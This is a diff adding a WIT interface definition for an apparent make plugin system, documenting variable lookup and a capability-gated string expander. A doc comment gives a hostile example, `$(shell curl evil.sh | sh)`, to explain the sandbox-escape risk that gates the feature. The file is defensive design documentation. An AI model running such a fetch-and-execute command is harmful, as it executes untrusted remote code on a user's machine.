@@ -1,0 +1,55 @@
+package makers:plugin@1.0.0;
+
+/// Global variable access, and the expander.
+///
+/// Split out from `graph` because the two have different security postures:
+/// reading a variable is a lookup, expanding a string is *executing make* —
+/// `$(shell ...)` runs a command, `$(guile ...)` used to run Guile, and
+/// `$(eval ...)` mutates the makefile database. Folding them into one
+/// interface would mean the capability check had nowhere to live.
+interface vars {
+    use graph.{variable};
+    use types.{error};
+
+    /// Look up a variable in the global scope. For the value a *target*
+    /// sees, use `node.variable` — per-target and pattern-specific
+    /// definitions do not appear here.
+    get: func(name: string) -> option<variable>;
+
+    /// Expand makefile text as make would.
+    ///
+    /// Requires the `expand-variables` capability, and it is the one
+    /// capability the host does not grant by default even to a plugin that
+    /// asks politely: `expand("$(shell curl evil.sh | sh)")` is arbitrary
+    /// code execution *outside* the wasm sandbox, in make's own process.
+    /// The sandbox is worth nothing if the guest can ask the host to run a
+    /// shell on its behalf, so this is opt-in per plugin instance and
+    /// prominently reported when granted.
+    ///
+    /// The reason it exists at all: a plugin that regenerates a build
+    /// description (an IDE compile database, a Ninja file, a Bazel
+    /// `BUILD` stub) has to turn `$(CC) $(CFLAGS) -c $<` into an actual
+    /// command line, and re-implementing make's expander inside every such
+    /// plugin is both a correctness disaster and a maintenance one.
+    expand: func(text: string) -> result<string, error>;
+
+    /// There is deliberately no `expand-for(target, text)`.
+    ///
+    /// The reason a caller would want one is `$@`/`$<`/`$^`/`$*`, and those
+    /// are not variables in any useful sense — they are properties of the
+    /// edge make is currently building, which is why they only exist while a
+    /// recipe is being prepared. The analysis phase is not building
+    /// anything, so a host-side "expand for this target" would have to
+    /// fabricate them, and would be quietly wrong the moment a target has
+    /// several recipes or a grouped rule.
+    ///
+    /// A plugin already has every automatic from this package's own
+    /// interfaces: `$@` is `node.name`, `$<` is the first element of
+    /// `node.deps`, `$^` is all of them, `$*` is `node.stem`. Substituting
+    /// those is plain string work the SDK does for you
+    /// (`makers_plugin::automatics`), and what is left — `$(CC)`,
+    /// `$(CFLAGS)`, user functions — is exactly what `expand` handles. The
+    /// genuinely target-scoped case (`main.o: CFLAGS += -O2`) is served by
+    /// `node.variable`, which walks per-target and pattern-specific
+    /// definitions before the global set.
+}
